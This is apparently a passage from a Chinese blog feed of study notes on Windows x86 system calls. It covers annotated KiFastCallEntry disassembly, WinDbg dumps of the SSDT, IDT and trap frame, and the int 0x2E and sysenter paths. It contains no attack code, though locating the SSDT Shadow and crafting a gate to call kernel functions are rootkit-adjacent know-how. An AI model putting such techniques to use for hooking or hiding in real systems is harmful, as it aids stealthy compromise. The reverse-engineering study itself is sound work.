; Save previous mode as user(保存先前模式)</span><br><span class="line">.text:004357A0                 sub     esp, 48h        ; 给ESP分配48h字节, 也就是DbgEbp到Eax所占据的空间</span><br><span class="line">.text:004357A0                                         ; allocate remainder of trap frame</span><br><span class="line">.text:004357A3                 sub     ebp, 29Ch       ; sub ebp, NPX_FRAME_LENGTH + KTRAP_FRAME_LENGTH</span><br><span class="line">.text:004357A3                                         ; 就是ebp指向了 _Ktrap_frame</span><br><span class="line">.text:004357A9                 mov     byte ptr [esi+13Ah], 1 ; esi+0x13Ah这个位置的偏移，就是新的&quot;先前模式&quot;为1，就是之前是从3环调用的这个代码</span><br><span class="line">.text:004357B0                 cmp     ebp, esp        ; 判断堆栈内压入的值是否正确(这些堆栈内压入的东西,就好比一个trap框架)</span><br><span class="line">.text:004357B2                 jnz     short loc_43574B ; 不正确重新来一遍</span><br><span class="line">.text:004357B4                 and     dword ptr [ebp+2Ch], 0 ; sDr7置0</span><br><span class="line">.text:004357B8                 test    byte ptr [esi+3], 0DFh ; 检查是否被调试</span><br><span class="line">.text:004357BC                 mov     [esi+128h], ebp ; 重新把修改过的TrapFrame设置回_KTHREAD的相应参数位置</span><br><span class="line">.text:004357C2                 jnz     Dr_FastCallDrSave ; 处于调试则保存那些寄存器</span><br><span class="line">.text:004357C8</span><br><span class="line">.text:004357C8 loc_4357C8:                             ; CODE XREF: Dr_FastCallDrSave+Dj</span><br><span class="line">.text:004357C8                                         ; Dr_FastCallDrSave+79j</span><br><span class="line">.text:004357C8                 mov     ebx, [ebp+60h]  ; Ebp给ebx</span><br><span class="line">.text:004357CB                 mov     edi, [ebp+68h]  ; eip给Edi</span><br><span class="line">.text:004357CE                 mov     [ebp+0Ch], edx  ; 参数地址给DbgArgPointer</span><br><span class="line">.text:004357D1                 mov     dword ptr [ebp+8], 0BADB0D00h</span><br><span class="line">.text:004357D8                 mov     [ebp+0], ebx    ; 3环ebp给调试DbgEbp</span><br><span class="line">.text:004357DB                 mov     [ebp+4], edi    ; 3环Eip给DbgEip</span><br><span class="line">.text:004357DE                 sti                     ; 开中断，允许硬件中断</span><br><span class="line">.text:004357DF</span><br><span class="line">.text:004357DF loc_4357DF:                             ; CODE XREF: _KiBBTUnexpectedRange+18j</span><br><span class="line">.text:004357DF                                         ; _KiSystemService+7Fj</span><br><span class="line">.text:004357DF                 mov     edi, eax        ; 取出系统调用号，给edi</span><br><span class="line">.text:004357E1                 shr     edi, 8          ; 系统调用号右移8位</span><br><span class="line">.text:004357E4                 and     edi, 10h        ; 将第12位；与1与，得到的数，看看是哪个的系统服务表，是Ntoskrl的还是Win32k.sys的</span><br><span class="line">.text:004357E7                 mov     ecx, edi        ; 调用号给ecx</span><br><span class="line">.text:004357E9                 add     edi, [esi+0BCh] ; edi的值加上ServiceTable，如果0就是第一个表，1就是第二个表</span><br><span class="line">.text:004357E9                                         ; 就是SSDT表</span><br><span class="line">.text:004357EF                 mov     ebx, eax        ; 调用序号给ebx</span><br><span class="line">.text:004357F1                 and     eax, 0FFFh      ; 系统调用号，只要后面12位</span><br><span class="line">.text:004357F6                 cmp     eax, [edi+8]    ; 调用号跟系统表函数总数作比较</span><br><span class="line">.text:004357F9                 jnb     _KiBBTUnexpectedRange ; 大于等于说明越界，到处理越界的地方去</span><br><span class="line">.text:004357FF                 cmp     ecx, 10h        ; 看看是1还是0，就是说看看是哪一张表</span><br><span class="line">.text:00435802                 jnz     short loc_43581E ; 是0，第一张表往上面跳转</span><br><span class="line">.text:00435804                 mov     ecx, [esi+88h]  ; Teb给ecx</span><br><span class="line">.text:0043580A                 xor     esi, esi        ; esi清0</span><br><span class="line">.text:0043580C</span><br><span class="line">.text:0043580C loc_43580C:                             ; DATA XREF: _KiTrap0E+156o</span><br><span class="line">.text:0043580C                 or      esi, [ecx+0F70h]</span><br><span class="line">.text:00435812                 jz      short loc_43581E</span><br><span class="line">.text:00435814                 push    edx</span><br><span class="line">.text:00435815                 push    eax</span><br><span class="line">.text:00435816                 call    ds:_KeGdiFlushUserBatch ; 是第二张表跳转到的函数,一般都是图像相关，动态加载的</span><br><span class="line">.text:0043581C                 pop     eax</span><br><span class="line">.text:0043581D                 pop     edx</span><br><span class="line">.text:0043581E</span><br><span class="line">.text:0043581E loc_43581E:                             ; CODE XREF: _KiFastCallEntry+B2j</span><br><span class="line">.text:0043581E                                         ; _KiFastCallEntry+C2j</span><br><span class="line">.text:0043581E                 inc     large dword ptr fs:6B0h</span><br><span class="line">.text:00435825                 mov     esi, edx        ; edx存储着3环传入函数的指针</span><br><span class="line">.text:00435827                 xor     ecx, ecx</span><br><span class="line">.text:00435829                 mov     edx, [edi+0Ch]  ; edi存的SSDT表，所以这里+0x0Ch是SSDT参数表起始的的地址</span><br><span class="line">.text:0043582C                 mov     edi, [edi]      ; 指向函数表的地址</span><br><span class="line">.text:0043582E                 mov     cl, [eax+edx]   ; eax系统调用号 参数表+调用号得到参数个数</span><br><span class="line">.text:00435831                 mov     edx, [edi+eax*4] ; 0环函数的地址,函数地址表参数4字节</span><br><span class="line">.text:00435834                 sub     esp, ecx        ; 提升堆栈，提高为Cl,因为参数是3环的，要把3环参数存到0环，所以是抬高这么高的栈针</span><br><span class="line">.text:00435836                 shr     ecx, 2          ; 为了下面rep movsd，一次复制4字节，复制ecx次，ecx保存参数个数单位是一字节，所以这里要除以4</span><br><span class="line">.text:00435839                 mov     edi, esp        ; 设置要复制的地址</span><br><span class="line">.text:0043583B                 cmp     esi, ds:_MmUserProbeAddress ; 判断用户函数地址范围有没有越界</span><br><span class="line">.text:00435841                 jnb     loc_435A75</span><br><span class="line">.text:00435847</span><br><span class="line">.text:00435847 loc_435847:                             ; CODE XREF: _KiFastCallEntry+329j</span><br><span class="line">.text:00435847                                         ; DATA XREF: _KiTrap0E:loc_438AD8o</span><br><span class="line">.text:00435847                 rep movsd               ; 开始复制参数</span><br><span class="line">.text:00435849                 test    byte ptr [ebp+6Ch], 1 ; SegCs</span><br><span class="line">.text:0043584D                 jz      short loc_435865</span><br><span class="line">.text:0043584F                 mov     ecx, large fs:124h</span><br><span class="line">.text:00435856                 mov     edi, [esp+7Ch+var_7C]</span><br><span class="line">.text:00435859                 mov     [ecx+13Ch], ebx</span><br><span class="line">.text:0043585F                 mov     [ecx+12Ch], edi</span><br><span class="line">.text:00435865</span><br><span class="line">.text:00435865 loc_435865:                             ; CODE XREF: _KiFastCallEntry+FDj</span><br><span class="line">.text:00435865                 mov     ebx, edx</span><br><span class="line">.text:00435867                 test    byte ptr ds:dword_52E0C8, 40h</span><br><span class="line">.text:0043586E                 setnz   byte ptr [ebp+12h]</span><br><span class="line">.text:00435872                 jnz     loc_435C04</span><br><span class="line">.text:00435878</span><br><span class="line">.text:00435878 loc_435878:                             ; CODE XREF: _KiFastCallEntry+4BBj</span><br><span class="line">.text:00435878                 call    ebx             ; 调用函数</span><br></pre></td></tr></table></figure><h2 id="API函数的调用过程（SSDT）"><a href="#API函数的调用过程（SSDT）" class="headerlink" title="API函数的调用过程（SSDT）"></a>API函数的调用过程（SSDT）</h2><p>在上一节课中，我们讲到系统服务表的结构，以及如何找到系统服务<br>表(KTHREAD  0xbc偏移).  </p><p>也可以通过SSDT访问<br>SSDT  的全称是 System Services Descriptor Table，系统服务描述符表<br>kd&gt; dd  KeServiceDescriptorTable(SSDT)ntosKrl是内核导出的<br>导出的 声明一下就可以使用了<br>kd&gt; dd  KeServiceDescriptorTableShadow(SSDT Shadow)<br>未导出 需要用其他的方式来查找   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line">83f789c0  83e8cd9c 00000000 00000191 83e8d3e4</span><br><span class="line">83f789d0  00000000 00000000 00000000 00000000</span><br><span class="line">83f789e0  83eeb6af 00000000 025355a9 000000bb</span><br><span class="line">83f789f0  00000011 00000100 5385d2ba d717548f</span><br><span class="line">83f78a00  83e8cd9c 00000000 00000191 83e8d3e4</span><br><span class="line">83f78a10  95d46000 00000000 00000339 95d4702c</span><br><span class="line">83f78a20  00000000 00000000 83f78a24 00000340</span><br><span class="line">83f78a30  00000340 865fab00 00000007 00000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">kd&gt; dd KeServiceDescriptorTableShadow</span><br><span class="line">83f78a00  83e8cd9c 00000000 00000191 83e8d3e4</span><br><span class="line">83f78a10  95d46000 00000000 00000339 95d4702c</span><br><span class="line">83f78a20  00000000 00000000 83f78a24 00000340</span><br><span class="line">83f78a30  00000340 865fab00 00000007 00000000</span><br><span class="line">83f78a40  865faa38 865fa7e0 865fa970 865fa8a8</span><br><span class="line">83f78a50  00000000 865fa718 00000000 00000000</span><br><span class="line">83f78a60  83e86809 83e93eed 83ea23a5 00000003</span><br><span class="line">83f78a70  80783000 80784000 00000120 ffffffff</span><br></pre></td></tr></table></figure><p>因为KeServiceDescriptorTableShadow没有导出，所以一般采用内存搜索获取这张表   </p><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>[1]：毛德操，《Windows内核情景分析》<br>[2]：滴水视频<br>[3]: 一大堆的别人的博客，重点博客<a href="https://blog.csdn.net/Sunny_wwc/article/details/5939848" target="_blank" rel="noopener">https://blog.csdn.net/Sunny_wwc/article/details/5939848</a>  </p>]]></content>
      
      <categories>
          
          <category> 笔记 - 系统调用笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统调用 </tag>
            
            <tag> 驱动学习 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>系统调用笔记上</title>
      <link href="/2018/06/30/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%AC%94%E8%AE%B0%E4%B8%8A/"/>
      <url>/2018/06/30/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E7%AC%94%E8%AE%B0%E4%B8%8A/</url>
      <content type="html"><![CDATA[<h1 id="API函数的调用过程（3环部分）"><a href="#API函数的调用过程（3环部分）" class="headerlink" title="API函数的调用过程（3环部分）"></a>API函数的调用过程（3环部分）</h1><h2 id="Windows-API"><a href="#Windows-API" class="headerlink" title="Windows API"></a>Windows API</h2><ol><li>Application Programming Interface，简称 API 函数。</li><li><p>Windows有多少个API?<br>主要是存放在 C:\WINDOWS\system32 下面所有的dll，dll里面函数都是API</p></li><li><p>几个重要的DLL<br>Kernel32.dll:最核心的功能模块，比如管理内存、进程和线程相关的函数等.<br>User32.dll:是Windows用户界面相关应用程序接口,如创建窗口和发送消息等.<br>GDI32.dll:全称是Graphical Device Interface(图形设备接口),包含用于画图和显示文本的函数.比如要显示一个程序窗口，就调用了其中的函数来画这个窗口.<br>Ntdll.dll:大多数API都会通过这个DLL进入内核(0环).</p></li></ol><p>做实验找 ReadProcessMemory<br>首先打开IDA，打开kernelBase.dll（XP是kernel32.dll），按ATL+T，如下图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/1.png?x-oss-process=style/yangruiqi.com" alt="图1"></p><p>然后就打开了ReadProcessMemory，如下图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/2.png?x-oss-process=style/yangruiqi.com" alt="图二"><br>发现是调用了NtReadVirtualMemory。<br>再去import里面找这个函数就知道谁调用了他<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/3.png?x-oss-process=style/yangruiqi.com" alt="3"></p><p>发现时ntdll，然后去找ntdll,的这个函数<br>NtReadVirtualMemory<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/4.png?x-oss-process=style/yangruiqi.com" alt="4"><br>真正读取进程内存的函数在0环，在这里的114h是一个编号，这个编号，对应的是真正的操作系统内核中某个函数，所以我们的API进内核都需要一个编号，这个编号就是真正执行的函数。下面的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov edx,7FFE0300h</span><br></pre></td></tr></table></figure><p>这是一个内存地址，存了一个函数，这个函数觉得了用什么方式进0环，也就是这段代码就是找到一个编号通过一个函数（edx）进入0环。<br>所以3环的API函数都是提供一个进入0环的接口而已。   </p><h1 id="API函数的调用过程（3环进0环-上）"><a href="#API函数的调用过程（3环进0环-上）" class="headerlink" title="API函数的调用过程（3环进0环 上）"></a>API函数的调用过程（3环进0环 上）</h1><p>下面我们说一下上面的7FFE0300h函数是什么，所以先了解下0x7ffe0000这页内存是什么。</p><h2 id="KUSER-SHARED-DATA（Kernel和Use共享了一块数据）"><a href="#KUSER-SHARED-DATA（Kernel和Use共享了一块数据）" class="headerlink" title="_KUSER_SHARED_DATA（Kernel和Use共享了一块数据）"></a>_KUSER_SHARED_DATA（Kernel和Use共享了一块数据）</h2><p>这块任何一个3环的程序都可以访问，他的地址是确定的。地址如下</p><ol><li>在 User 层和 Kernel 层分别定义了一个 _KUSER_SHARED_DATA 结构区域，用于 User 层和 Kernel 层共享某些数据   </li><li>它们使用固定的地址值映射，_KUSER_SHARED_DATA 结构区域在 User 和 Kernel 层地址分别为：<ol><li>User 层地址为：0x7ffe0000   </li><li>Kernnel 层地址为：0xffdf0000  </li></ol></li></ol><p>这两个不同的线性地址，指向的是同一个物理页，区别就是0环通过这个线性地址对这块内存可读可写，但是3环是只读，虽然指向的是同一个物理页，但在User 层是只读的，在Kernnel层是可写的.<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/5XFT%24MTSEVTT3PC%7B0V_38%40P.png?x-oss-process=style/yangruiqi.com" alt="5"></p><p>如上图，查看下内容一样</p><h2 id="0x7FFE0300到底存储的是什么？"><a href="#0x7FFE0300到底存储的是什么？" class="headerlink" title="0x7FFE0300到底存储的是什么？"></a>0x7FFE0300到底存储的是什么？</h2><p>然后查看下_KUSER_SHARED_DATA这个内存<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/FM%60M1%7EA%7D3G%25PL6E%29LD2JKSC.png?x-oss-process=style/yangruiqi.com" alt="6"></p><p>查看到300处偏移就是一个叫SystemCall，这个位置存储的函数有两种情况：   </p><p>实验：是否支持快速调用</p><p>当通过eax=1来执行cpuid指令时，处理器的特征信息被放在ecx和edx寄存器中，其中edx包含了一个SEP位（11位），该位指明了当前处理器知否支持sysenter/sysexit指令</p><p>支持：<br>ntdll.dll!KiFastSystemCall()//这个不是内核函数，是ntdll的</p><p>不支持：<br>ntdll.dll!KiIntSystemCall()<br>实验如下，改eax=1，ecx，edx清0，命令改成CPUID</p><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/Z00%5D%5BD8IRJPWLRBM7DSX%254I.png?x-oss-process=style/yangruiqi.com" alt="7"><br>edx=0F8BFBFF，2进制是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">‭1111100010111111101111111111‬</span><br></pre></td></tr></table></figure></p><p>第11位是1，支持，支持时把KiFastSystemCall()写到300偏移处的地址上，不支持KiIntSystemCall()写过去   </p><h2 id="进0环需要更改哪些寄存器？"><a href="#进0环需要更改哪些寄存器？" class="headerlink" title="进0环需要更改哪些寄存器？"></a>进0环需要更改哪些寄存器？</h2><ol><li>CS的权限由3变为0  意味着需要新的CS</li></ol><p>2) SS与CS的权限永远一致 需要新的SS</p><p>3) 权限发生切换的时候，堆栈也一定会切换，需要新的ESP</p><p>4) 进0环后代码的位置，需要EIP  </p><h2 id="不支持快速调用时候，中断门进0环："><a href="#不支持快速调用时候，中断门进0环：" class="headerlink" title="不支持快速调用时候，中断门进0环："></a>不支持快速调用时候，中断门进0环：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:77F070C0                 public KiIntSystemCall</span><br><span class="line">.text:77F070C0 KiIntSystemCall proc near               ; DATA XREF: .text:off_77EF61B8o</span><br><span class="line">.text:77F070C0</span><br><span class="line">.text:77F070C0 arg_4           = byte ptr  8</span><br><span class="line">.text:77F070C0</span><br><span class="line">.text:77F070C0                 lea     edx, [esp+arg_4]//edx是参数指针，系统调用号在eax寄存器</span><br><span class="line">.text:77F070C4                 int     2Eh             ; DOS 2+ internal - EXECUTE COMMAND</span><br><span class="line">.text:77F070C4                                         ; DS:SI -&gt; counted CR-terminated command string</span><br><span class="line">.text:77F070C6                 retn</span><br><span class="line">.text:77F070C6 KiIntSystemCall endp</span><br></pre></td></tr></table></figure><p>就2行，把当前函数参数地址存到edx，我们之前往eax存了个内核函数编号，直接通过中断门进入内核。    </p><h2 id="当CPU支持快速调用时候"><a href="#当CPU支持快速调用时候" class="headerlink" title="当CPU支持快速调用时候"></a>当CPU支持快速调用时候</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text:77F070B0 KiFastSystemCall proc near              ; DATA XREF: .text:off_77EF61B8o</span><br><span class="line">.text:77F070B0                 mov     edx, esp</span><br><span class="line">.text:77F070B2                 sysenter</span><br></pre></td></tr></table></figure><p>edx是参数，eax还是编号，没用中断门了，用的sysenter</p><h3 id="为什么叫快速调用？"><a href="#为什么叫快速调用？" class="headerlink" title="为什么叫快速调用？"></a>为什么叫快速调用？</h3><p>中断门进0环，需要的CS、EIP在IDT表中，需要查内存(SS与ESP由TSS提供)，比较慢<br>而CPU如果支持sysenter指令时，操作系统会提前将CS/SS/ESP/EIP的值存储在MSR寄存器中，sysenter指令执行时，CPU会将MSR寄存器中的值直接写入相关<br>寄存器，没有读内存的过程，所以叫快速调用，本质是一样的！</p><h2 id="中断门-INT-0x2E进0环"><a href="#中断门-INT-0x2E进0环" class="headerlink" title="中断门 INT 0x2E进0环"></a>中断门 INT 0x2E进0环</h2><p>步骤一：在IDT表中找到0x2E号门描述符</p><p>步骤二：分析CS/SS/ESP/EIP的来源</p><p>步骤三：分析EIP是什么</p><p>所以做如下实验：   </p><p>通过windbg先查看IDT表，然后找到2Eh也就是第46项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dq 80b95400 l40</span><br><span class="line">80b95400  83e48e00`00080fc0 83e48e00`00081150</span><br><span class="line">80b95410  00008500`00580000 83e4ee00`000815c0</span><br><span class="line">80b95420  83e4ee00`00081748 83e48e00`000818a8</span><br><span class="line">80b95430  83e48e00`00081a1c 83e48e00`00082018</span><br><span class="line">80b95440  00008500`00500000 83e48e00`00082478</span><br><span class="line">80b95450  83e48e00`0008259c 83e48e00`000826dc</span><br><span class="line">80b95460  83e48e00`0008293c 83e48e00`00082c2c</span><br><span class="line">80b95470  83e48e00`000832fc 83e48e00`000836b0</span><br><span class="line">80b95480  83e48e00`000837d4 83e48e00`00083914</span><br><span class="line">80b95490  00008500`00a00000 83e48e00`00083a80</span><br><span class="line">80b954a0  83e48e00`000836b0 83e48e00`000836b0</span><br><span class="line">80b954b0  83e48e00`000836b0 83e48e00`000836b0</span><br><span class="line">80b954c0  83e48e00`000836b0 83e48e00`000836b0</span><br><span class="line">80b954d0  83e48e00`000836b0 83e48e00`000836b0</span><br><span class="line">80b954e0  83e48e00`000836b0 83e48e00`000836b0</span><br><span class="line">80b954f0  83e48e00`000836b0 84228e00`0008eaf8</span><br><span class="line">80b95500  00000000`00080000 00000000`00080000</span><br><span class="line">80b95510  00000000`00080000 00000000`00080000</span><br><span class="line">80b95520  00000000`00080000 00000000`00080000</span><br><span class="line">80b95530  00000000`00080000 00000000`00080000</span><br><span class="line">80b95540  00000000`00080000 00000000`00080000</span><br><span class="line">80b95550  83e4ee00`0008063a 83e4ee00`000807c0</span><br><span class="line">80b95560  83e4ee00`000808fc 83e4ee00`00081498</span><br><span class="line">80b95570  83e3ee00`0008ffee 83e48e00`000836b0</span><br><span class="line">80b95580  83e38e00`0008f6b0 83e38e00`0008f6ba</span><br><span class="line">80b95590  83e38e00`0008f6c4 83e38e00`0008f6ce</span><br><span class="line">80b955a0  83e38e00`0008f6d8 83e38e00`0008f6e2</span><br><span class="line">80b955b0  83e38e00`0008f6ec 84228e00`0008e104</span><br><span class="line">80b955c0  83e38e00`0008f700 83e38e00`0008f70a</span><br><span class="line">80b955d0  83e38e00`0008f714 83e38e00`0008f71e</span><br><span class="line">80b955e0  83e38e00`0008f728 83e38e00`0008f732</span><br><span class="line">80b955f0  83e38e00`0008f73c 83e38e00`0008f746</span><br></pre></td></tr></table></figure></p><p>所以通过中断门进入0环就是83e3ee00`0008ffee，</p><p>根据描述符，是中断门，代码段选择子cs是0008，要执行的EIP是前后2字节83e3ffee,ss,esp由TSS得的，下面分析进入0环时候，代码从哪开始执行，用U可以对地址反汇编。<br>所以通过中断门进入0环要执行的函数是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; u 83e3ffee</span><br><span class="line">nt!KiSystemService://nt,所以是真正的内核模块了</span><br><span class="line">83e3ffee 6a00            push    0</span><br><span class="line">83e3fff0 55              push    ebp</span><br><span class="line">83e3fff1 53              push    ebx</span><br><span class="line">83e3fff2 56              push    esi</span><br><span class="line">83e3fff3 57              push    edi</span><br><span class="line">83e3fff4 0fa0            push    fs</span><br><span class="line">83e3fff6 bb30000000      mov     ebx,30h</span><br><span class="line">83e3fffb 668ee3          mov     fs,bx</span><br></pre></td></tr></table></figure><h2 id="sysenter进0环"><a href="#sysenter进0环" class="headerlink" title="sysenter进0环"></a>sysenter进0环</h2><p>因为通过sysenter进0环省略查找IDT，TSS表的步骤，所以快，所以这些信息在执行sysenter指令之前，操作系统必须指定0环的CS段、SS段、EIP以及ESP，存在MSR寄存器里<br>MSR | 地址<br>—|—<br>IA32_SYSENTER_CS | 174H<br>IA32_SYSENTER_ESP | 175H<br>IA32_SYSENTER_EIP|176H</p><p>可以通过RDMSR/WRMST来进行读写（操作系统使用WRMST写该寄存器）:</p><p>kd&gt; rdmsr 174   //查看CS，cs+8就是ss选择子<br>kd&gt; rdmsr 175   //查看ESP<br>kd&gt; rdmsr 176   //查看EIP   </p><p>参考：Intel白皮书第二卷(搜索sysenter)<br>这些都是硬件CPU做的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; rdmsr 174</span><br><span class="line">msr[174] = 00000000`00000008</span><br><span class="line">kd&gt; rdmst 175</span><br><span class="line">        ^ Bad register error in &apos;rdmst 175&apos;</span><br><span class="line">kd&gt; rdmsr 175</span><br><span class="line">msr[175] = 00000000`80792000</span><br><span class="line">kd&gt; rdmsr 176</span><br><span class="line">msr[176] = 00000000`83e400c0</span><br><span class="line">kd&gt; u 83e400c0</span><br><span class="line">nt!KiFastCallEntry:</span><br><span class="line">83e400c0 b923000000      mov     ecx,23h</span><br><span class="line">83e400c5 6a30            push    30h</span><br><span class="line">83e400c7 0fa1            pop     fs</span><br><span class="line">83e400c9 8ed9            mov     ds,cx</span><br><span class="line">83e400cb 8ec1            mov     es,cx</span><br><span class="line">83e400cd 648b0d40000000  mov     ecx,dword ptr fs:[40h]</span><br><span class="line">83e400d4 8b6104          mov     esp,dword ptr [ecx+4]</span><br><span class="line">83e400d7 6a23            push    23h</span><br></pre></td></tr></table></figure><p>根据查看通过sysenter进入0环，用的函数是KiFastCallEntry   </p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>API通过中断门进0环：</p><pre><code>1)  固定中断号为0x2E2)  CS/EIP由门描述符提供   ESP/SS由TSS提供3)  进入0环后执行的内核函数：NT!KiSystemService</code></pre><p>API通过sysenter指令进0环：</p><pre><code>1)  CS/ESP/EIP由MSR寄存器提供(SS是算出来的)2)  进入0环后执行的内核函数：NT!KiFastCallEntry</code></pre><p>内核模块：ntoskrnl.exe/ntkrnlpa.exe   </p><h3 id="1、自己实现通过中断门直接调用内核函数。"><a href="#1、自己实现通过中断门直接调用内核函数。" class="headerlink" title="1、自己实现通过中断门直接调用内核函数。"></a>1、自己实现通过中断门直接调用内核函数。</h3><p>Call XXXXEE000008XXXX//xxxx是内核函数地址偏移，让Eax等于调用号，然后调KiSystemService和KiFastCallEntry，E是构造了个1110，是p位有效，11是3环就能访问我，0是系统段。   </p><h1 id="进0环后，原来的寄存器存在哪里？"><a href="#进0环后，原来的寄存器存在哪里？" class="headerlink" title="进0环后，原来的寄存器存在哪里？"></a>进0环后，原来的寄存器存在哪里？</h1><p>拿KiSystemService举例。<br>首先要认识几个结构体：<br>Trap_Frame结构：<br>不论通过中断门和快速调用进入0环，所有寄存器都存这。   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _Ktrap_frame</span><br><span class="line">ntdll!_KTRAP_FRAME</span><br><span class="line">   +0x000 DbgEbp           : Uint4B</span><br><span class="line">   +0x004 DbgEip           : Uint4B</span><br><span class="line">   +0x008 DbgArgMark       : Uint4B</span><br><span class="line">   +0x00c DbgArgPointer    : Uint4B</span><br><span class="line">   +0x010 TempSegCs        : Uint2B</span><br><span class="line">   +0x012 Logging          : UChar</span><br><span class="line">   +0x013 Reserved         : UChar</span><br><span class="line">   +0x014 TempEsp          : Uint4B</span><br><span class="line">   +0x018 Dr0              : Uint4B</span><br><span class="line">   +0x01c Dr1              : Uint4B</span><br><span class="line">   +0x020 Dr2              : Uint4B</span><br><span class="line">   +0x024 Dr3              : Uint4B</span><br><span class="line">   +0x028 Dr6              : Uint4B</span><br><span class="line">   +0x02c Dr7              : Uint4B</span><br><span class="line">   +0x030 SegGs            : Uint4B</span><br><span class="line">   +0x034 SegEs            : Uint4B</span><br><span class="line">   +0x038 SegDs            : Uint4B</span><br><span class="line">   +0x03c Edx              : Uint4B</span><br><span class="line">   +0x040 Ecx              : Uint4B</span><br><span class="line">   +0x044 Eax              : Uint4B</span><br><span class="line">   +0x048 PreviousPreviousMode : Uint4B</span><br><span class="line">   +0x04c ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +0x050 SegFs            : Uint4B</span><br><span class="line">   +0x054 Edi              : Uint4B</span><br><span class="line">   +0x058 Esi              : Uint4B</span><br><span class="line">   +0x05c Ebx              : Uint4B</span><br><span class="line">   +0x060 Ebp              : Uint4B</span><br><span class="line">   +0x064 ErrCode          : Uint4B</span><br><span class="line">   +0x068 Eip              : Uint4B</span><br><span class="line">   +0x06c SegCs            : Uint4B</span><br><span class="line">   +0x070 EFlags           : Uint4B</span><br><span class="line">   +0x074 HardwareEsp      : Uint4B</span><br><span class="line">   +0x078 HardwareSegSs    : Uint4B</span><br><span class="line">   +0x07c V86Es            : Uint4B</span><br><span class="line">   +0x080 V86Ds            : Uint4B</span><br><span class="line">   +0x084 V86Fs            : Uint4B</span><br><span class="line">   +0x088 V86Gs            : Uint4B</span><br></pre></td></tr></table></figure><p>ETHREAD线程相关的结构体。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 